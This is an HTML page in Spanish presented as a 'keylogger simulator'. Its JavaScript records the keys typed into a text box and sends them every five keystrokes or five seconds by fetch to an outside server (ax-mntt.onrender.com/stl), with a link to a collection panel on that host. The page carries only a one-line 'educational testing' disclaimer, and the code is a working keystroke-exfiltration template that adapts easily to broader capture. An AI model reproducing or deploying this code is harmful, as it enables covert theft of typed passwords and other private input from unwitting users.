<!DOCTYPE html>
<html>
<head>
    <title>Simulador de Keylogger</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #f5f5f5; padding: 30px; border-radius: 12px; }
        textarea { width: 100%; height: 100px; padding: 10px; }
        .btn { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; }
        .resultado { background: #1a1a2e; color: #00ff41; padding: 15px; border-radius: 6px; margin-top: 20px; font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⌨️ Simulador de Keylogger</h1>
        <p>Escribe en el cuadro de abajo. Las teclas se enviarán a tu panel.</p>
        
        <p><strong>Servidor:</strong> https://ax-mntt.onrender.com</p>
        
        <textarea id="texto" placeholder="Escribe algo aquí..."></textarea>
        <br>
        <button class="btn" onclick="limpiar()">🗑️ Limpiar</button>
        <button class="btn" onclick="verPanel()">👀 Ver panel</button>
        
        <div class="resultado" id="resultado">
            Esperando teclas...
        </div>
        
        <p style="font-size: 12px; color: #666; margin-top: 20px;">
            ⚠️ Esto es solo para pruebas educativas. No lo uses en sitios reales sin permiso.
        </p>
    </div>
    
    <script>
        let buffer = '';
        let contador = 0;
        const servidor = 'https://ax-mntt.onrender.com';
        
        document.addEventListener('keydown', function(e) {
            // Solo si el foco está en el textarea
            if (e.target.tagName !== 'TEXTAREA') return;
            
            let tecla = e.key;
            
            // Manejar teclas especiales
            if (tecla === 'Enter') tecla = '[ENTER]\n';
            else if (tecla === 'Backspace') tecla = '[DEL]';
            else if (tecla === 'Tab') tecla = '[TAB]';
            else if (tecla === 'Shift') tecla = '[SHIFT]';
            else if (tecla === 'Control') tecla = '[CTRL]';
            else if (tecla === 'Alt') tecla = '[ALT]';
            else if (tecla === 'Escape') tecla = '[ESC]';
            else if (tecla === 'ArrowUp') tecla = '[UP]';
            else if (tecla === 'ArrowDown') tecla = '[DOWN]';
            else if (tecla === 'ArrowLeft') tecla = '[LEFT]';
            else if (tecla === 'ArrowRight') tecla = '[RIGHT]';
            
            // Si es una tecla imprimible
            if (tecla.length === 1 || tecla.startsWith('[')) {
                buffer += tecla;
                contador++;
                actualizarVista();
            }
            
            // Enviar cada 5 teclas
            if (contador >= 5) {
                enviarTeclas();
            }
        });
        
        function enviarTeclas() {
            if (buffer.length > 0) {
                const data = 'keylog:' + buffer;
                fetch(`${servidor}/stl?data=${encodeURIComponent(data)}`)
                    .then(() => {
                        console.log('✅ Teclas enviadas:', data);
                    })
                    .catch(error => {
                        console.error('❌ Error:', error);
                    });
                
                buffer = '';
                contador = 0;
                actualizarVista();
            }
        }
        
        function actualizarVista() {
            const resultado = document.getElementById('resultado');
            const texto = buffer.replace(/\n/g, '↵');
            resultado.innerHTML = `Teclas en buffer: ${contador}\n\n${texto || 'Esperando teclas...'}`;
        }
        
        function limpiar() {
            buffer = '';
            contador = 0;
            document.getElementById('texto').value = '';
            actualizarVista();
        }
        
        function verPanel() {
            window.open(`${servidor}/panel`, '_blank');
        }
        
        // Enviar cada 5 segundos
        setInterval(enviarTeclas, 5000);
        
        // Mostrar instrucciones
        console.log('⌨️ Keylogger activo. Escribe en el textarea para probar.');
        console.log(`📡 Enviando a: ${servidor}/stl`);
    </script>
</body>
</html>
